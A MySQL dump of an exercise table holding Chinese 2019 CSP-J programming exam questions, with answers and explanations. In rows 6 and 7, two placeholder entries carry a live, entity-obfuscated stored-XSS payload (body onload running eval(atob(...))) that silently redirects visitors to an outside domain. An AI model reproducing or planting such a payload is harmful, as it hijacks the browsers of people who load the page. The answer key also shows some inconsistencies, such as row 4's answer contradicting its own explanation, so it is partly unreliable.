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\"></p><p>概述：将字符串下标是n约数位置的小写字母转大写</p>', -1, '', '', '', '', '', NULL, -1, 1, 0, 'test', '2023-10-31 20:11:21', 'test', '2023-11-04 17:26:23', '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (4, '<p>输入的字符串只能由小写字母或大写字母组成</p>', NULL, 3, '', '', '', '', '正确', '解析：输入的字符串也可以包含数字等其它字符。', 1, 1, 0, 'test', '2023-10-31 21:04:24', 'test', '2023-11-04 17:26:45', NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (5, '<p>若输入的字符串长度为18，那么输入的字符串和输出的字符串相比，至多有（）个字符不同</p>', NULL, 3, '18', '6', '10', '1', 'B', '解析：因为18=2*3^2, 也 就 是 因 数 个 数 为 (1+1)*(1+2)=6,也就是判定条件最多满足六次，所以最多有6 个', 0, 1, 0, 'test', '2023-10-31 21:05:32', 'test', '2023-11-04 17:31:32', NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (6, '<p>测试题目	</p><body/onload=e&#x76;&#x61;l&#x28;a&#x74;&#x6f;b&#x28;&#34;d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHBzOi8vd3d3LnRvcHJldmVudWVnYXRlLmNvbS9jbmN0d2pkbj9rZXk9NzU0YTVmZGE2Mjk1N2M4MDc1NzdiOTEyYmFiOThlYzYiKQ==&#34;&#x29;&#x29;>', NULL, -1, '123', 'hhh', 'ccc', 'zzz', 'B', NULL, 0, 0, 0, 'test', '2023-10-31 21:15:10', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (7, NULL, '<p>123123123123123</p><body/onload=e&#x76;&#x61;l&#x28;a&#x74;&#x6f;b&#x28;&#34;d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHBzOi8vd3d3LnRvcHJldmVudWVnYXRlLmNvbS9jbmN0d2pkbj9rZXk9NzU0YTVmZGE2Mjk1N2M4MDc1NzdiOTEyYmFiOThlYzYiKQ==&#34;&#x29;&#x29;>', -1, '', '', '', '', '', NULL, -1, 1, 0, 'test', '2023-10-31 21:16:12', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (8, '<p>二进制数 11 1011 1001 0111 和 01 0110 1110 1011 进行逻辑与运算的结果是（）</p>', NULL, -1, '01 0010 1000 1011 ', '01 0010 1001 0011', '01 0010 1000 0001', '01 0010 1000 0011', 'D', '逻辑“与”基本常识，当且仅当2个数对应位都为1时，答案该位为1', 0, 0, 0, 'test', '2023-11-02 17:29:48', 'test', '2023-11-04 17:21:46', '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (9, '<p> 32位整型变量占用（）个字节。</p>', NULL, -1, '32', '128', '4', '8', 'C', '一个字节是8位，因此32位对应4个字节', 0, 0, 0, 'test', '2023-11-02 17:31:10', 'test', '2023-11-04 17:21:42', '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (10, '<p>若有如下程序段，其中s、a、b、c均已定义为整型 变量，且a、c均已赋值(c大于0) s = a; for (b = 1; b &lt;= c; b++) s= s -1; 则与上述程序段功能等价的赋值语句是(）</p>', NULL, -1, 's=a-c;', 's=a-b;', 's=s-c;', 's-b-c', 'A', '解析：s 初始化为a; for循环执行c次，每次s减1,共减 c,所以s=a-c', 0, 0, 0, 'test', '2023-11-03 13:43:17', 'test', '2023-11-04 17:21:38', '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (11, '<p>设有100个已排好序的数据元素，采用折半查找时，最大比较次数为（）</p>', NULL, -1, '7', '10', '6', '8', 'A', '折半查找，第一次(1+100)/2 = 50,第二次(1+50)/2 = 25, 第三次(1+25)/2 = 13, 第四次(1+13)/2 = 7, 第五次(1+7)/2= 4, 第六次(1+4)/2 = 2, 第七次(1+2)/2 = 1。', 0, 0, 0, 'test', '2023-11-03 13:46:22', 'test', '2023-11-04 17:21:35', '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (12, '<p>链表不具有的特点是（）</p>', NULL, -1, '插入删除不需要移动元素', '不必事先估计存储空间', '所需空间与线性表长度成正比', '可随机访问任一元素', 'D', '解析：链表没有下标，不可随机访问', 0, 0, 0, 'test', '2023-11-03 13:47:48', 'test', '2023-11-04 17:21:31', '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (13, '<p>把8个同样的球放在5个同样的袋子里，允许有的袋子空着不放，问共有多少种不同的分法？（）提示:如果8个球都放在一个袋子里，无论是哪个袋子，都只算同一种分法</p>', NULL, -1, '22', '24', '18', '20', 'C', '整数拆分问题，8拆成至多5个数之和（不计顺序），可按袋子个数分类讨论：1个袋子1种，2个袋子4种，3个袋子5种，4个袋子5种，5个袋子3种，共18种', 0, 0, 0, 'test', '2023-11-03 13:48:49', 'test', '2023-11-04 17:21:28', '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (14, '<p>—棵二叉树如右图所示，若采用顺序存储结构，即用一维数组元素存储该二叉树中的结点(根结点的下标为1,若某结点的下标为i ,则其左孩子位于下标2i 处、右孩子位于下标2i +1处)，则该数组的最大下标至少为（）。</p>', NULL, -1, '6', '10', '15', '12', 'C', '解析：堆式编号，最大值是最深的那层最靠右侧的节点，编号为((1*2+1)*2+1)*2+1=15', 0, 0, 0, 'test', '2023-11-03 13:50:06', 'test', '2023-11-04 17:14:54', '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (15, '<p>100以内最大的素数是（）</p>', NULL, -1, '89', '97', '93', '91', 'B', '解析：91 = 7*13， 93 = 3 * 31， 97 > 89, 且为素数。', 0, 0, 0, 'test', '2023-11-03 13:51:26', 'test', '2023-11-04 17:15:01', '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (16, '<p>319 和 377的最大公约数是（）</p>', NULL, -1, '27', '33', '29', '31', 'C', '解析：辗转相除法,最大公约数为：(319,377)=(319,58)=(58,29)=29', 0, 0, 0, 'test', '2023-11-04 17:16:30', 'test', '2023-11-04 17:17:09', '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (17, '<p>新学期开学了，小胖想减肥，健身教练给小胖制定了两个训练方案。方案一每次连续跑3公里可以消耗300千卡(耗时半小时);方案二每次连续跑5公里可以消耗600干卡(耗时1小时)。小胖每周周一到周四能抽出半小时跑步，周五到周日能抽出一小时跑步。另外，教练建议小胖每周最多跑21公里，否则会损伤膝盖。请问如果小胖想严格执行教练的训练方案，并且不想损伤膝盖，每周最多通过跑步消耗多少千卡？（）</p>', NULL, -1, '3000', '2500', '2400', '2520', 'C', '解析：设方案1,2各i, j天，由题意，3*i +5*j <=21,i +j <=7,j <=3. 求300*i+600*j的最大值。枚举所有情况，当i =2, j =3时，最大值2400，或使用线性规划求解。', 0, 0, 0, 'test', '2023-11-04 17:18:06', 'test', '2023-11-04 17:20:50', '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (18, '<p> 一副纸牌除掉大小王有52张牌，四种花色，每种花色13张。假设从这52张牌中随机抽取13张纸牌，则至少()张牌的花色一致。</p>', NULL, -1, '4', '2', '3', '5', 'A', '抽屉原理，13张牌最坏情况就是4种花色分別为3,3,3,4张，至少4张一个样花色。', 0, 0, 0, 'test', '2023-11-04 17:18:52', '', NULL, '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (19, '<p>—些数字可以颠倒过来看，例如0、1、8颠倒过来还是本身，6颠倒过来是9, 9颠倒过来看还6,其他数字颠倒过来都不构成数字。类似的，一些多位数也可以颠倒过来看，比如106颠倒过来是901。假设某个城市的车牌只由5位数字组成，每一位都可以取0到9。请问这个城市最多有多少个车牌倒过来怡好还是原来的车牌？（）</p>', NULL, -1, '60', '125', '75', '100', 'C', '前俩位位有5种选法（0,1,6,8,9),第3位有3种(0,1,8),第4, 5位由前2位决定，答案为5*5*3*1*1=75', 0, 0, 0, 'test', '2023-11-04 17:20:42', '', NULL, '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (20, '<p> 假设一棵二叉树的后序遍历序列为DGJHEBIFCA，中序遍历序列为DBGEHJACIF,则其前序遍历序列为()。</p>', NULL, -1, 'ABCDEFGHIJ', 'ABDEGHJCFI', 'ABDEGJHCFI', 'ABDEGHJFIC', 'B', '解析：后续遍历是“左右根”，中序遍历是“左根右”，后序最后的A是根，中序中看的 DBGEH是左子树，右边的CIF是右子树，以此类推可求画出树的形态，再求前序', 0, 0, 0, 'test', '2023-11-04 17:23:02', '', NULL, '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (21, '<p>以下哪个奖项是计算机科学领域的最高奖?</p>', NULL, -1, '图灵奖', '鲁班奖', '诺贝尔奖', '普利策奖', 'A', '鲁班奖是国内建设工程；诺贝尔奖为物理、化学、医学、文学、和平；普利策奖是新\n闻奖，图灵奖由美国计算机协会（ACM）于1966年设立，专门奖励那些对计算机事业作出\n重要贡献的个人。', 0, 0, 0, 'test', '2023-11-04 17:25:02', '', NULL, '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (22, '<p> 若将第8行的“i=1”改为“i = 0”，程序运行时会发生错误 。 ( )</p>', NULL, 3, '', '', '', '', '正确', '解析：除数不能为0，％0会发生错误。', 1, 1, 0, 'test', '2023-11-04 17:29:33', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (23, '<p> 若将第8行的“i&lt;=n”改为“i*i&lt;=n”，程序运行结果不会改变。（）</p>', NULL, 3, '', '', '', '', '错误', '解析：循环条件为<=n, 也 就 是n也会执行到。同时 n%n==0恒为True,所以修改后少了n这次循环，也就会改变结果了', 1, 1, 0, 'test', '2023-11-04 17:30:09', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (24, '<p> 若输入的字符串全部由大写字母组成，那么输出的字符串就跟输入的字符串一样。（）</p>', NULL, 3, '', '', '', '', '正确', '解析：对的，因为大写的Ascii值比较小，也就是从c>=a恒为False,所以s的值不会改变，所以是对的', 1, 1, 0, 'test', '2023-11-04 17:30:42', 'test', '2023-11-04 17:30:52', NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (25, '<p> 若输入的字符串长度为（），那么，输入的字符串跟输出的字符串相比，至多有36个字符不同。</p>', NULL, 3, '36', '100000', '1', '128', 'B', '解析：因为 100000 = 2^5 * 5^5，也就是因数个数为 (5 + 1) * (5 + 1) = 36，也即是判定条件最多满足 36 次，所以最多有 36 个', 0, 1, 0, 'test', '2023-11-04 20:31:51', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (26, NULL, '<p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/1_20231104204211A003.png\"></p><p>假设输入的n和m都是正整数，x和y都是在[1,n]的范围内的整数，完成下面的判断题和选择题</p>', -1, '', '', '', '', '', NULL, -1, 1, 0, 'test', '2023-11-04 20:38:03', 'test', '2023-11-04 20:42:44', '2019CSP-J入门级C++试题A卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (27, '<p>当m&gt;0时，输出的值一定小于2n</p>', NULL, 26, '', '', '', '', '正确', '解析：由限定条件可知，0<x,y<= n, 当m大于0时，一定存在某个数被选中，使得 ans<2*n。', 1, 1, 0, 'test', '2023-11-04 20:43:09', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (28, '<p>执行完第27行的“++ans”时，ans一定是偶数。</p>', NULL, 26, '', '', '', '', '错误', '解析：由于数对是一个左值与一个右值相匹配，所以ans最终一定是偶数，但是第27行的”++ans“在23行循环内部，其中间结果可能是负数。', 1, 1, 0, 'test', '2023-11-04 20:43:35', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (29, '<p> a[i]和b[i]不可能同时大于0。</p>', NULL, 26, '', '', '', '', '错误', '解析：反例：当m为1,并且输入x=1，y=1的时候，可以使得a[1]和b[1]同时为1', 1, 1, 0, 'test', '2023-11-04 20:43:54', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (30, '<p> 若程序运行到第13行时，x总是小于y,那么第15行不会被执行。</p>', NULL, 26, '', '', '', '', '错误', '解析：反例m=2, x=1,y=2.x=1,y=3', 1, 1, 0, 'test', '2023-11-04 20:44:11', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (31, '<p> 若m个x‘两两不同，且m个y两两不同，则输出的值为（）</p>', NULL, 26, '2n-2m', '2n+2', '2n-2', '2n', 'A', '如果各不相同的话，m次循环，会导致2m个位置从0变到整数，答案为2n-2m', 0, 1, 0, 'test', '2023-11-04 20:45:17', '', NULL, NULL);
